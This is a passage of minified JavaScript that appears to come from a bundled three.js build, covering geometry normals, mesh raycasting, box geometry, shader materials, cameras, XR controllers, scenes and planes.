P=1/(f.x*v.y-v.x*f.y);isFinite(P)&&(y.copy(p).multiplyScalar(v.y).addScaledVector(d,-f.y).multiplyScalar(P),m.copy(d).multiplyScalar(f.x).addScaledVector(p,-v.x).multiplyScalar(P),o[L].add(y),o[w].add(y),o[E].add(y),l[L].add(m),l[w].add(m),l[E].add(m))}let g=this.groups;g.length===0&&(g=[{start:0,count:e.count}]);for(let L=0,w=g.length;L<w;++L){const E=g[L],P=E.start,G=E.count;for(let V=P,Z=P+G;V<Z;V+=3)u(e.getX(V+0),e.getX(V+1),e.getX(V+2))}const _=new H,b=new H,T=new H,A=new H;function C(L){T.fromBufferAttribute(s,L),A.copy(T);const w=o[L];_.copy(w),_.sub(T.multiplyScalar(T.dot(w))).normalize(),b.crossVectors(A,w);const P=b.dot(l[L])<0?-1:1;a.setXYZW(L,_.x,_.y,_.z,P)}for(let L=0,w=g.length;L<w;++L){const E=g[L],P=E.start,G=E.count;for(let V=P,Z=P+G;V<Z;V+=3)C(e.getX(V+0)),C(e.getX(V+1)),C(e.getX(V+2))}}computeVertexNormals(){const e=this.index,n=this.getAttribute("position");if(n!==void 0){let i=this.getAttribute("normal");if(i===void 0)i=new li(new Float32Array(n.count*3),3),this.setAttribute("normal",i);else for(let h=0,f=i.count;h<f;h++)i.setXYZ(h,0,0,0);const s=new H,r=new H,a=new H,o=new H,l=new H,c=new H,p=new H,d=new H;if(e)for(let h=0,f=e.count;h<f;h+=3){const v=e.getX(h+0),y=e.getX(h+1),m=e.getX(h+2);s.fromBufferAttribute(n,v),r.fromBufferAttribute(n,y),a.fromBufferAttribute(n,m),p.subVectors(a,r),d.subVectors(s,r),p.cross(d),o.fromBufferAttribute(i,v),l.fromBufferAttribute(i,y),c.fromBufferAttribute(i,m),o.add(p),l.add(p),c.add(p),i.setXYZ(v,o.x,o.y,o.z),i.setXYZ(y,l.x,l.y,l.z),i.setXYZ(m,c.x,c.y,c.z)}else for(let h=0,f=n.count;h<f;h+=3)s.fromBufferAttribute(n,h+0),r.fromBufferAttribute(n,h+1),a.fromBufferAttribute(n,h+2),p.subVectors(a,r),d.subVectors(s,r),p.cross(d),i.setXYZ(h+0,p.x,p.y,p.z),i.setXYZ(h+1,p.x,p.y,p.z),i.setXYZ(h+2,p.x,p.y,p.z);this.normalizeNormals(),i.needsUpdate=!0}}normalizeNormals(){const e=this.attributes.normal;for(let n=0,i=e.count;n<i;n++)It.fromBufferAttribute(e,n),It.normalize(),e.setXYZ(n,It.x,It.y,It.z)}toNonIndexed(){function e(o,l){const c=o.array,p=o.itemSize,d=o.normalized,h=new c.constructor(l.length*p);let f=0,v=0;for(let y=0,m=l.length;y<m;y++){o.isInterleavedBufferAttribute?f=l[y]*o.data.stride+o.offset:f=l[y]*p;for(let u=0;u<p;u++)h[v++]=c[f++]}return new li(h,p,d)}if(this.index===null)return Ie("BufferGeometry.toNonIndexed(): BufferGeometry is already non-indexed."),this;const n=new $n,i=this.index.array,s=this.attributes;for(const o in s){const l=s[o],c=e(l,i);n.setAttribute(o,c)}const r=this.morphAttributes;for(const o in r){const l=[],c=r[o];for(let p=0,d=c.length;p<d;p++){const h=c[p],f=e(h,i);l.push(f)}n.morphAttributes[o]=l}n.morphTargetsRelative=this.morphTargetsRelative;const a=this.groups;for(let o=0,l=a.length;o<l;o++){const c=a[o];n.addGroup(c.start,c.count,c.materialIndex)}return n}toJSON(){const e={metadata:{version:4.7,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(e.uuid=this.uuid,e.type=this.type,this.name!==""&&(e.name=this.name),Object.keys(this.userData).length>0&&(e.userData=this.userData),this.parameters!==void 0){const l=this.parameters;for(const c in l)l[c]!==void 0&&(e[c]=l[c]);return e}e.data={attributes:{}};const n=this.index;n!==null&&(e.data.index={type:n.array.constructor.name,array:Array.prototype.slice.call(n.array)});const i=this.attributes;for(const l in i){const c=i[l];e.data.attributes[l]=c.toJSON(e.data)}const s={};let r=!1;for(const l in this.morphAttributes){const c=this.morphAttributes[l],p=[];for(let d=0,h=c.length;d<h;d++){const f=c[d];p.push(f.toJSON(e.data))}p.length>0&&(s[l]=p,r=!0)}r&&(e.data.morphAttributes=s,e.data.morphTargetsRelative=this.morphTargetsRelative);const a=this.groups;a.length>0&&(e.data.groups=JSON.parse(JSON.stringify(a)));const o=this.boundingSphere;return o!==null&&(e.data.boundingSphere=o.toJSON()),e}clone(){return new this.constructor().copy(this)}copy(e){this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null;const n={};this.name=e.name;const i=e.index;i!==null&&this.setIndex(i.clone());const s=e.attributes;for(const c in s){const p=s[c];this.setAttribute(c,p.clone(n))}const r=e.morphAttributes;for(const c in r){const p=[],d=r[c];for(let h=0,f=d.length;h<f;h++)p.push(d[h].clone(n));this.morphAttributes[c]=p}this.morphTargetsRelative=e.morphTargetsRelative;const a=e.groups;for(let c=0,p=a.length;c<p;c++){const d=a[c];this.addGroup(d.start,d.count,d.materialIndex)}const o=e.boundingBox;o!==null&&(this.boundingBox=o.clone());const l=e.boundingSphere;return l!==null&&(this.boundingSphere=l.clone()),this.drawRange.start=e.drawRange.start,this.drawRange.count=e.drawRange.count,this.userData=e.userData,this}dispose(){this.dispatchEvent({type:"dispose"})}}const pm=new bt,vs=new Sw,Io=new ch,hm=new H,Do=new H,Uo=new H,Oo=new H,iu=new H,Fo=new H,fm=new H,Bo=new H;class Nn extends $t{constructor(e=new $n,n=new uh){super(),this.isMesh=!0,this.type="Mesh",this.geometry=e,this.material=n,this.morphTargetDictionary=void 0,this.morphTargetInfluences=void 0,this.count=1,this.updateMorphTargets()}copy(e,n){return super.copy(e,n),e.morphTargetInfluences!==void 0&&(this.morphTargetInfluences=e.morphTargetInfluences.slice()),e.morphTargetDictionary!==void 0&&(this.morphTargetDictionary=Object.assign({},e.morphTargetDictionary)),this.material=Array.isArray(e.material)?e.material.slice():e.material,this.geometry=e.geometry,this}updateMorphTargets(){const n=this.geometry.morphAttributes,i=Object.keys(n);if(i.length>0){const s=n[i[0]];if(s!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let r=0,a=s.length;r<a;r++){const o=s[r].name||String(r);this.morphTargetInfluences.push(0),this.morphTargetDictionary[o]=r}}}}getVertexPosition(e,n){const i=this.geometry,s=i.attributes.position,r=i.morphAttributes.position,a=i.morphTargetsRelative;n.fromBufferAttribute(s,e);const o=this.morphTargetInfluences;if(r&&o){Fo.set(0,0,0);for(let l=0,c=r.length;l<c;l++){const p=o[l],d=r[l];p!==0&&(iu.fromBufferAttribute(d,e),a?Fo.addScaledVector(iu,p):Fo.addScaledVector(iu.sub(n),p))}n.add(Fo)}return n}raycast(e,n){const i=this.geometry,s=this.material,r=this.matrixWorld;s!==void 0&&(i.boundingSphere===null&&i.computeBoundingSphere(),Io.copy(i.boundingSphere),Io.applyMatrix4(r),vs.copy(e.ray).recast(e.near),!(Io.containsPoint(vs.origin)===!1&&(vs.intersectSphere(Io,hm)===null||vs.origin.distanceToSquared(hm)>(e.far-e.near)**2))&&(pm.copy(r).invert(),vs.copy(e.ray).applyMatrix4(pm),!(i.boundingBox!==null&&vs.intersectsBox(i.boundingBox)===!1)&&this._computeIntersections(e,n,vs)))}_computeIntersections(e,n,i){let s;const r=this.geometry,a=this.material,o=r.index,l=r.attributes.position,c=r.attributes.uv,p=r.attributes.uv1,d=r.attributes.normal,h=r.groups,f=r.drawRange;if(o!==null)if(Array.isArray(a))for(let v=0,y=h.length;v<y;v++){const m=h[v],u=a[m.materialIndex],g=Math.max(m.start,f.start),_=Math.min(o.count,Math.min(m.start+m.count,f.start+f.count));for(let b=g,T=_;b<T;b+=3){const A=o.getX(b),C=o.getX(b+1),L=o.getX(b+2);s=zo(this,u,e,i,c,p,d,A,C,L),s&&(s.faceIndex=Math.floor(b/3),s.face.materialIndex=m.materialIndex,n.push(s))}}else{const v=Math.max(0,f.start),y=Math.min(o.count,f.start+f.count);for(let m=v,u=y;m<u;m+=3){const g=o.getX(m),_=o.getX(m+1),b=o.getX(m+2);s=zo(this,a,e,i,c,p,d,g,_,b),s&&(s.faceIndex=Math.floor(m/3),n.push(s))}}else if(l!==void 0)if(Array.isArray(a))for(let v=0,y=h.length;v<y;v++){const m=h[v],u=a[m.materialIndex],g=Math.max(m.start,f.start),_=Math.min(l.count,Math.min(m.start+m.count,f.start+f.count));for(let b=g,T=_;b<T;b+=3){const A=b,C=b+1,L=b+2;s=zo(this,u,e,i,c,p,d,A,C,L),s&&(s.faceIndex=Math.floor(b/3),s.face.materialIndex=m.materialIndex,n.push(s))}}else{const v=Math.max(0,f.start),y=Math.min(l.count,f.start+f.count);for(let m=v,u=y;m<u;m+=3){const g=m,_=m+1,b=m+2;s=zo(this,a,e,i,c,p,d,g,_,b),s&&(s.faceIndex=Math.floor(m/3),n.push(s))}}}}function kw(t,e,n,i,s,r,a,o){let l;if(e.side===hn?l=i.intersectTriangle(a,r,s,!0,o):l=i.intersectTriangle(s,r,a,e.side===ls,o),l===null)return null;Bo.copy(o),Bo.applyMatrix4(t.matrixWorld);const c=n.ray.origin.distanceTo(Bo);return c<n.near||c>n.far?null:{distance:c,point:Bo.clone(),object:t}}function zo(t,e,n,i,s,r,a,o,l,c){t.getVertexPosition(o,Do),t.getVertexPosition(l,Uo),t.getVertexPosition(c,Oo);const p=kw(t,e,n,i,Do,Uo,Oo,fm);if(p){const d=new H;Gn.getBarycoord(fm,Do,Uo,Oo,d),s&&(p.uv=Gn.getInterpolatedAttribute(s,o,l,c,d,new Ze)),r&&(p.uv1=Gn.getInterpolatedAttribute(r,o,l,c,d,new Ze)),a&&(p.normal=Gn.getInterpolatedAttribute(a,o,l,c,d,new H),p.normal.dot(i.direction)>0&&p.normal.multiplyScalar(-1));const h={a:o,b:l,c,normal:new H,materialIndex:0};Gn.getNormal(Do,Uo,Oo,h.normal),p.face=h,p.barycoord=d}return p}class io extends $n{constructor(e=1,n=1,i=1,s=1,r=1,a=1){super(),this.type="BoxGeometry",this.parameters={width:e,height:n,depth:i,widthSegments:s,heightSegments:r,depthSegments:a};const o=this;s=Math.floor(s),r=Math.floor(r),a=Math.floor(a);const l=[],c=[],p=[],d=[];let h=0,f=0;v("z","y","x",-1,-1,i,n,e,a,r,0),v("z","y","x",1,-1,i,n,-e,a,r,1),v("x","z","y",1,1,e,i,n,s,a,2),v("x","z","y",1,-1,e,i,-n,s,a,3),v("x","y","z",1,-1,e,n,i,s,r,4),v("x","y","z",-1,-1,e,n,-i,s,r,5),this.setIndex(l),this.setAttribute("position",new tn(c,3)),this.setAttribute("normal",new tn(p,3)),this.setAttribute("uv",new tn(d,2));function v(y,m,u,g,_,b,T,A,C,L,w){const E=b/C,P=T/L,G=b/2,V=T/2,Z=A/2,O=C+1,z=L+1;let F=0,I=0;const X=new H;for(let K=0;K<z;K++){const ne=K*P-V;for(let ye=0;ye<O;ye++){const Le=ye*E-G;X[y]=Le*g,X[m]=ne*_,X[u]=Z,c.push(X.x,X.y,X.z),X[y]=0,X[m]=0,X[u]=A>0?1:-1,p.push(X.x,X.y,X.z),d.push(ye/C),d.push(1-K/L),F+=1}}for(let K=0;K<L;K++)for(let ne=0;ne<C;ne++){const ye=h+ne+O*K,Le=h+ne+O*(K+1),Ke=h+(ne+1)+O*(K+1),Qe=h+(ne+1)+O*K;l.push(ye,Le,Qe),l.push(Le,Ke,Qe),I+=6}o.addGroup(f,I,w),f+=I,h+=F}}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new io(e.width,e.height,e.depth,e.widthSegments,e.heightSegments,e.depthSegments)}}function Ur(t){const e={};for(const n in t){e[n]={};for(const i in t[n]){const s=t[n][i];s&&(s.isColor||s.isMatrix3||s.isMatrix4||s.isVector2||s.isVector3||s.isVector4||s.isTexture||s.isQuaternion)?s.isRenderTargetTexture?(Ie("UniformsUtils: Textures of render targets cannot be cloned via cloneUniforms() or mergeUniforms()."),e[n][i]=null):e[n][i]=s.clone():Array.isArray(s)?e[n][i]=s.slice():e[n][i]=s}}return e}function Jt(t){const e={};for(let n=0;n<t.length;n++){const i=Ur(t[n]);for(const s in i)e[s]=i[s]}return e}function Lw(t){const e=[];for(let n=0;n<t.length;n++)e.push(t[n].clone());return e}function j0(t){const e=t.getRenderTarget();return e===null?t.outputColorSpace:e.isXRRenderTarget===!0?e.texture.colorSpace:We.workingColorSpace}const Nw={clone:Ur,merge:Jt};var Iw=`void main() {
	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
}`,Dw=`void main() {
	gl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );
}`;class di extends no{constructor(e){super(),this.isShaderMaterial=!0,this.type="ShaderMaterial",this.defines={},this.uniforms={},this.uniformsGroups=[],this.vertexShader=Iw,this.fragmentShader=Dw,this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.clipping=!1,this.forceSinglePass=!0,this.extensions={clipCullDistance:!1,multiDraw:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv1:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,this.glslVersion=null,e!==void 0&&this.setValues(e)}copy(e){return super.copy(e),this.fragmentShader=e.fragmentShader,this.vertexShader=e.vertexShader,this.uniforms=Ur(e.uniforms),this.uniformsGroups=Lw(e.uniformsGroups),this.defines=Object.assign({},e.defines),this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.fog=e.fog,this.lights=e.lights,this.clipping=e.clipping,this.extensions=Object.assign({},e.extensions),this.glslVersion=e.glslVersion,this.defaultAttributeValues=Object.assign({},e.defaultAttributeValues),this.index0AttributeName=e.index0AttributeName,this.uniformsNeedUpdate=e.uniformsNeedUpdate,this}toJSON(e){const n=super.toJSON(e);n.glslVersion=this.glslVersion,n.uniforms={};for(const s in this.uniforms){const a=this.uniforms[s].value;a&&a.isTexture?n.uniforms[s]={type:"t",value:a.toJSON(e).uuid}:a&&a.isColor?n.uniforms[s]={type:"c",value:a.getHex()}:a&&a.isVector2?n.uniforms[s]={type:"v2",value:a.toArray()}:a&&a.isVector3?n.uniforms[s]={type:"v3",value:a.toArray()}:a&&a.isVector4?n.uniforms[s]={type:"v4",value:a.toArray()}:a&&a.isMatrix3?n.uniforms[s]={type:"m3",value:a.toArray()}:a&&a.isMatrix4?n.uniforms[s]={type:"m4",value:a.toArray()}:n.uniforms[s]={value:a}}Object.keys(this.defines).length>0&&(n.defines=this.defines),n.vertexShader=this.vertexShader,n.fragmentShader=this.fragmentShader,n.lights=this.lights,n.clipping=this.clipping;const i={};for(const s in this.extensions)this.extensions[s]===!0&&(i[s]=!0);return Object.keys(i).length>0&&(n.extensions=i),n}}class X0 extends $t{constructor(){super(),this.isCamera=!0,this.type="Camera",this.matrixWorldInverse=new bt,this.projectionMatrix=new bt,this.projectionMatrixInverse=new bt,this.coordinateSystem=ii,this._reversedDepth=!1}get reversedDepth(){return this._reversedDepth}copy(e,n){return super.copy(e,n),this.matrixWorldInverse.copy(e.matrixWorldInverse),this.projectionMatrix.copy(e.projectionMatrix),this.projectionMatrixInverse.copy(e.projectionMatrixInverse),this.coordinateSystem=e.coordinateSystem,this}getWorldDirection(e){return super.getWorldDirection(e).negate()}updateMatrixWorld(e){super.updateMatrixWorld(e),this.matrixWorldInverse.copy(this.matrixWorld).invert()}updateWorldMatrix(e,n){super.updateWorldMatrix(e,n),this.matrixWorldInverse.copy(this.matrixWorld).invert()}clone(){return new this.constructor().copy(this)}}const zi=new H,mm=new Ze,gm=new Ze;class xn extends X0{constructor(e=50,n=1,i=.1,s=2e3){super(),this.isPerspectiveCamera=!0,this.type="PerspectiveCamera",this.fov=e,this.zoom=1,this.near=i,this.far=s,this.focus=10,this.aspect=n,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}copy(e,n){return super.copy(e,n),this.fov=e.fov,this.zoom=e.zoom,this.near=e.near,this.far=e.far,this.focus=e.focus,this.aspect=e.aspect,this.view=e.view===null?null:Object.assign({},e.view),this.filmGauge=e.filmGauge,this.filmOffset=e.filmOffset,this}setFocalLength(e){const n=.5*this.getFilmHeight()/e;this.fov=Qd*2*Math.atan(n),this.updateProjectionMatrix()}getFocalLength(){const e=Math.tan(Uc*.5*this.fov);return .5*this.getFilmHeight()/e}getEffectiveFOV(){return Qd*2*Math.atan(Math.tan(Uc*.5*this.fov)/this.zoom)}getFilmWidth(){return this.filmGauge*Math.min(this.aspect,1)}getFilmHeight(){return this.filmGauge/Math.max(this.aspect,1)}getViewBounds(e,n,i){zi.set(-1,-1,.5).applyMatrix4(this.projectionMatrixInverse),n.set(zi.x,zi.y).multiplyScalar(-e/zi.z),zi.set(1,1,.5).applyMatrix4(this.projectionMatrixInverse),i.set(zi.x,zi.y).multiplyScalar(-e/zi.z)}getViewSize(e,n){return this.getViewBounds(e,mm,gm),n.subVectors(gm,mm)}setViewOffset(e,n,i,s,r,a){this.aspect=e/n,this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=e,this.view.fullHeight=n,this.view.offsetX=i,this.view.offsetY=s,this.view.width=r,this.view.height=a,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const e=this.near;let n=e*Math.tan(Uc*.5*this.fov)/this.zoom,i=2*n,s=this.aspect*i,r=-.5*s;const a=this.view;if(this.view!==null&&this.view.enabled){const l=a.fullWidth,c=a.fullHeight;r+=a.offsetX*s/l,n-=a.offsetY*i/c,s*=a.width/l,i*=a.height/c}const o=this.filmOffset;o!==0&&(r+=e*o/this.getFilmWidth()),this.projectionMatrix.makePerspective(r,r+s,n,n-i,e,this.far,this.coordinateSystem,this.reversedDepth),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(e){const n=super.toJSON(e);return n.object.fov=this.fov,n.object.zoom=this.zoom,n.object.near=this.near,n.object.far=this.far,n.object.focus=this.focus,n.object.aspect=this.aspect,this.view!==null&&(n.object.view=Object.assign({},this.view)),n.object.filmGauge=this.filmGauge,n.object.filmOffset=this.filmOffset,n}}const tr=-90,nr=1;class Uw extends $t{constructor(e,n,i){super(),this.type="CubeCamera",this.renderTarget=i,this.coordinateSystem=null,this.activeMipmapLevel=0;const s=new xn(tr,nr,e,n);s.layers=this.layers,this.add(s);const r=new xn(tr,nr,e,n);r.layers=this.layers,this.add(r);const a=new xn(tr,nr,e,n);a.layers=this.layers,this.add(a);const o=new xn(tr,nr,e,n);o.layers=this.layers,this.add(o);const l=new xn(tr,nr,e,n);l.layers=this.layers,this.add(l);const c=new xn(tr,nr,e,n);c.layers=this.layers,this.add(c)}updateCoordinateSystem(){const e=this.coordinateSystem,n=this.children.concat(),[i,s,r,a,o,l]=n;for(const c of n)this.remove(c);if(e===ii)i.up.set(0,1,0),i.lookAt(1,0,0),s.up.set(0,1,0),s.lookAt(-1,0,0),r.up.set(0,0,-1),r.lookAt(0,1,0),a.up.set(0,0,1),a.lookAt(0,-1,0),o.up.set(0,1,0),o.lookAt(0,0,1),l.up.set(0,1,0),l.lookAt(0,0,-1);else if(e===Il)i.up.set(0,-1,0),i.lookAt(-1,0,0),s.up.set(0,-1,0),s.lookAt(1,0,0),r.up.set(0,0,1),r.lookAt(0,1,0),a.up.set(0,0,-1),a.lookAt(0,-1,0),o.up.set(0,-1,0),o.lookAt(0,0,1),l.up.set(0,-1,0),l.lookAt(0,0,-1);else throw new Error("THREE.CubeCamera.updateCoordinateSystem(): Invalid coordinate system: "+e);for(const c of n)this.add(c),c.updateMatrixWorld()}update(e,n){this.parent===null&&this.updateMatrixWorld();const{renderTarget:i,activeMipmapLevel:s}=this;this.coordinateSystem!==e.coordinateSystem&&(this.coordinateSystem=e.coordinateSystem,this.updateCoordinateSystem());const[r,a,o,l,c,p]=this.children,d=e.getRenderTarget(),h=e.getActiveCubeFace(),f=e.getActiveMipmapLevel(),v=e.xr.enabled;e.xr.enabled=!1;const y=i.texture.generateMipmaps;i.texture.generateMipmaps=!1,e.setRenderTarget(i,0,s),e.render(n,r),e.setRenderTarget(i,1,s),e.render(n,a),e.setRenderTarget(i,2,s),e.render(n,o),e.setRenderTarget(i,3,s),e.render(n,l),e.setRenderTarget(i,4,s),e.render(n,c),i.texture.generateMipmaps=y,e.setRenderTarget(i,5,s),e.render(n,p),e.setRenderTarget(d,h,f),e.xr.enabled=v,i.texture.needsPMREMUpdate=!0}}class q0 extends Yt{constructor(e=[],n=Fs,i,s,r,a,o,l,c,p){super(e,n,i,s,r,a,o,l,c,p),this.isCubeTexture=!0,this.flipY=!1}get images(){return this.image}set images(e){this.image=e}}class Y0 extends oi{constructor(e=1,n={}){super(e,e,n),this.isWebGLCubeRenderTarget=!0;const i={width:e,height:e,depth:1},s=[i,i,i,i,i,i];this.texture=new q0(s),this._setTextureOptions(n),this.texture.isRenderTargetTexture=!0}fromEquirectangularTexture(e,n){this.texture.type=n.type,this.texture.colorSpace=n.colorSpace,this.texture.generateMipmaps=n.generateMipmaps,this.texture.minFilter=n.minFilter,this.texture.magFilter=n.magFilter;const i={uniforms:{tEquirect:{value:null}},vertexShader:`

				varying vec3 vWorldDirection;

				vec3 transformDirection( in vec3 dir, in mat4 matrix ) {

					return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );

				}

				void main() {

					vWorldDirection = transformDirection( position, modelMatrix );

					#include <begin_vertex>
					#include <project_vertex>

				}
			`,fragmentShader:`

				uniform sampler2D tEquirect;

				varying vec3 vWorldDirection;

				#include <common>

				void main() {

					vec3 direction = normalize( vWorldDirection );

					vec2 sampleUV = equirectUv( direction );

					gl_FragColor = texture2D( tEquirect, sampleUV );

				}
			`},s=new io(5,5,5),r=new di({name:"CubemapFromEquirect",uniforms:Ur(i.uniforms),vertexShader:i.vertexShader,fragmentShader:i.fragmentShader,side:hn,blending:Mi});r.uniforms.tEquirect.value=n;const a=new Nn(s,r),o=n.minFilter;return n.minFilter===Rs&&(n.minFilter=qt),new Uw(1,10,this).update(e,a),n.minFilter=o,a.geometry.dispose(),a.material.dispose(),this}clear(e,n=!0,i=!0,s=!0){const r=e.getRenderTarget();for(let a=0;a<6;a++)e.setRenderTarget(this,a),e.clear(n,i,s);e.setRenderTarget(r)}}class ua extends $t{constructor(){super(),this.isGroup=!0,this.type="Group"}}const Ow={type:"move"};class su{constructor(){this._targetRay=null,this._grip=null,this._hand=null}getHandSpace(){return this._hand===null&&(this._hand=new ua,this._hand.matrixAutoUpdate=!1,this._hand.visible=!1,this._hand.joints={},this._hand.inputState={pinching:!1}),this._hand}getTargetRaySpace(){return this._targetRay===null&&(this._targetRay=new ua,this._targetRay.matrixAutoUpdate=!1,this._targetRay.visible=!1,this._targetRay.hasLinearVelocity=!1,this._targetRay.linearVelocity=new H,this._targetRay.hasAngularVelocity=!1,this._targetRay.angularVelocity=new H),this._targetRay}getGripSpace(){return this._grip===null&&(this._grip=new ua,this._grip.matrixAutoUpdate=!1,this._grip.visible=!1,this._grip.hasLinearVelocity=!1,this._grip.linearVelocity=new H,this._grip.hasAngularVelocity=!1,this._grip.angularVelocity=new H),this._grip}dispatchEvent(e){return this._targetRay!==null&&this._targetRay.dispatchEvent(e),this._grip!==null&&this._grip.dispatchEvent(e),this._hand!==null&&this._hand.dispatchEvent(e),this}connect(e){if(e&&e.hand){const n=this._hand;if(n)for(const i of e.hand.values())this._getHandJoint(n,i)}return this.dispatchEvent({type:"connected",data:e}),this}disconnect(e){return this.dispatchEvent({type:"disconnected",data:e}),this._targetRay!==null&&(this._targetRay.visible=!1),this._grip!==null&&(this._grip.visible=!1),this._hand!==null&&(this._hand.visible=!1),this}update(e,n,i){let s=null,r=null,a=null;const o=this._targetRay,l=this._grip,c=this._hand;if(e&&n.session.visibilityState!=="visible-blurred"){if(c&&e.hand){a=!0;for(const y of e.hand.values()){const m=n.getJointPose(y,i),u=this._getHandJoint(c,y);m!==null&&(u.matrix.fromArray(m.transform.matrix),u.matrix.decompose(u.position,u.rotation,u.scale),u.matrixWorldNeedsUpdate=!0,u.jointRadius=m.radius),u.visible=m!==null}const p=c.joints["index-finger-tip"],d=c.joints["thumb-tip"],h=p.position.distanceTo(d.position),f=.02,v=.005;c.inputState.pinching&&h>f+v?(c.inputState.pinching=!1,this.dispatchEvent({type:"pinchend",handedness:e.handedness,target:this})):!c.inputState.pinching&&h<=f-v&&(c.inputState.pinching=!0,this.dispatchEvent({type:"pinchstart",handedness:e.handedness,target:this}))}else l!==null&&e.gripSpace&&(r=n.getPose(e.gripSpace,i),r!==null&&(l.matrix.fromArray(r.transform.matrix),l.matrix.decompose(l.position,l.rotation,l.scale),l.matrixWorldNeedsUpdate=!0,r.linearVelocity?(l.hasLinearVelocity=!0,l.linearVelocity.copy(r.linearVelocity)):l.hasLinearVelocity=!1,r.angularVelocity?(l.hasAngularVelocity=!0,l.angularVelocity.copy(r.angularVelocity)):l.hasAngularVelocity=!1));o!==null&&(s=n.getPose(e.targetRaySpace,i),s===null&&r!==null&&(s=r),s!==null&&(o.matrix.fromArray(s.transform.matrix),o.matrix.decompose(o.position,o.rotation,o.scale),o.matrixWorldNeedsUpdate=!0,s.linearVelocity?(o.hasLinearVelocity=!0,o.linearVelocity.copy(s.linearVelocity)):o.hasLinearVelocity=!1,s.angularVelocity?(o.hasAngularVelocity=!0,o.angularVelocity.copy(s.angularVelocity)):o.hasAngularVelocity=!1,this.dispatchEvent(Ow)))}return o!==null&&(o.visible=s!==null),l!==null&&(l.visible=r!==null),c!==null&&(c.visible=a!==null),this}_getHandJoint(e,n){if(e.joints[n.jointName]===void 0){const i=new ua;i.matrixAutoUpdate=!1,i.visible=!1,e.joints[n.jointName]=i,e.add(i)}return e.joints[n.jointName]}}class Fw extends $t{constructor(){super(),this.isScene=!0,this.type="Scene",this.background=null,this.environment=null,this.fog=null,this.backgroundBlurriness=0,this.backgroundIntensity=1,this.backgroundRotation=new ui,this.environmentIntensity=1,this.environmentRotation=new ui,this.overrideMaterial=null,typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}copy(e,n){return super.copy(e,n),e.background!==null&&(this.background=e.background.clone()),e.environment!==null&&(this.environment=e.environment.clone()),e.fog!==null&&(this.fog=e.fog.clone()),this.backgroundBlurriness=e.backgroundBlurriness,this.backgroundIntensity=e.backgroundIntensity,this.backgroundRotation.copy(e.backgroundRotation),this.environmentIntensity=e.environmentIntensity,this.environmentRotation.copy(e.environmentRotation),e.overrideMaterial!==null&&(this.overrideMaterial=e.overrideMaterial.clone()),this.matrixAutoUpdate=e.matrixAutoUpdate,this}toJSON(e){const n=super.toJSON(e);return this.fog!==null&&(n.object.fog=this.fog.toJSON()),this.backgroundBlurriness>0&&(n.object.backgroundBlurriness=this.backgroundBlurriness),this.backgroundIntensity!==1&&(n.object.backgroundIntensity=this.backgroundIntensity),n.object.backgroundRotation=this.backgroundRotation.toArray(),this.environmentIntensity!==1&&(n.object.environmentIntensity=this.environmentIntensity),n.object.environmentRotation=this.environmentRotation.toArray(),n}}class Bw extends Yt{constructor(e=null,n=1,i=1,s,r,a,o,l,c=Bt,p=Bt,d,h){super(null,a,o,l,c,p,s,r,d,h),this.isDataTexture=!0,this.image={data:e,width:n,height:i},this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}const ru=new H,zw=new H,Vw=new Ue;class ws{constructor(e=new H(1,0,0),n=0){this.isPlane=!0,this.normal=e,this.constant=n}set(e,n){return this.normal.copy(e),this.constant=n,this}setComponents(e,n,i,s){return this.normal.set(e,n,i),this.constant=s,this}setFromNormalAndCoplanarPoint(e,n){return this.normal.copy(e),this.constant=-n.dot(this.normal),this}setFromCoplanarPoints(e,n,i){const s=ru.subVectors(i,n).cross(zw.subVectors(e,n)).normalize();return this.setFromNormalAndCoplanarPoint(s,e),this}copy(e){return this.normal.copy(e.normal),this.constant=e.constant,this}normalize(){const e=1/this.normal.length();return this.normal.multiplyScalar(e),this.constant*=e,this}negate(){return this.constant*=-1,this.normal.negate(),this}distanceToPoint(e){return this.normal.dot(e)+this.constant}distanceToSphere(e){return this.distanceToPoint(e.center)-e.radius}projectPoint(e,n){return n.copy(e).addScaledVector(this.normal,-this.distanceToPoint(e))}intersectLine(e,n){const i=e.delta(ru),s=this.normal.dot(i);if(s===0)return this.distanceToPoint(e.start)===0?n.copy(e.start):null;const r=-(e.start.dot(this.normal)+this.constant)/s;return r<0||r>1?null:n.copy(e.start).addScaledVector(i,r)}intersectsLine(e){const n=this.distanceToPoint(e.start),i=this.distanceToPoint(e.end);return n<0&&i>0||i<0&&n>0}intersectsBox(e){return e.intersectsPlane(this)}intersectsSphere(e){return e.intersectsPlane(this)}coplanarPoint(e){return e.copy(this.normal).multiplyScalar(-this.constant)}applyMatrix4(e,n){const i=n||Vw.getNormalMatrix(e),s=this.coplanarPoint(ru).applyMatrix4(e),r=this.normal.applyMatrix3(i).normalize();return this.constant=-s.dot(r),this}translate(e){return this.constant-=e.dot(this.normal),this}equals(e){return e.normal.equals(this.normal)&&e.constant===this.constant}clone(){return new this.constructor().copy(this)}}const _s=new ch,Hw=new Ze(.5,.5),Vo=new H;class dh{constructor(e=new ws,n=new ws,i=new ws,s=new ws,r=new ws,a=new ws){this.planes=[e,n,i,s,r,a]}set(e,n,i,s,r,a){const o=this.planes;return o[0].copy(e),o[1].copy(n),o[2].copy(i),o[3].copy(s),o[4].copy(r),o[5].copy(a),this}copy(e){const n=this.planes;for(let 